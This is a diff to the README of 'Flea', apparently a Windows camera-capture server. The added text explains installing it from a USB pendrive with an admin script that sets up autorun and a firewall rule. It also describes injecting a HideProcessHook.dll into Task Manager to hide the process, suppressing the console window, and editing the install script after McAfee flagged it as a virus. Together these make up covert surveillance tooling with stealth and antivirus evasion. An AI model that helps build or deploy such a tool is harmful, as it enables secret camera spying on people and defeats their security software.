@@ -193,10 +193,21 @@ You can specify IP address on which the server will be listen on:
 The port number is sewn into the program code. It can be changed there or a new functionality could be written to specify it as a command parameter.
 If you ran the server in the console you can stop it by CTRL-C.
 
-If you need a fast installation on a computer try using *installflea.ps1* script located in install folder. All you wanna do is to copy flea.exe, CameraLib.dll and installflea.ps1 into USB pendrive, connect it to computer you want to install the software on and run as administrator the script. The Flea will be installed automatically. New autorun task and new firewall rule will be created for you.
+If you need a fast installation on a computer try using *installflea.ps1* script located in install folder. All you wanna do is to copy flea.exe, CameraLib.dll, HideProcessHook.dll and installflea.ps1 into USB pendrive, connect it to computer you want to install the software on and run the script as administrator. The Flea will be installed automatically. New autorun task and new firewall rule will be created for you.
 You can modify the script further to achive the functonality you want.
 This script will work only on Windows and in PowerShell environment.
 Unfortunately you will probably see a message about permission to access the network. You should confirm.
+
+It is not mandatory to copy the HideProcessHook.dll file. But if you want to take advantage of hiding the program in the Windows Task Manager, it must be placed in the application directory. It'll be injected to The Task Manager to hide the flea.exe process. This is possible only when flea.exe is running in elevated privileges. That is why the install script registers the task with highest run level.
+**Remember to uncomment line in main.rs file if you want to not show the cmd window:**
+
+```rust
+//#![windows_subsystem = "windows"]
+```
+
+## Antivirus
+
+I was able to test it on McAfee only and it blocked installation using install.ps1 script saying it is a virus (which is not completely true but I'm not going to dwell on this too much). I had to remove run the flea.exe from the script. That seems to work.
 
 ## Camera capture
 
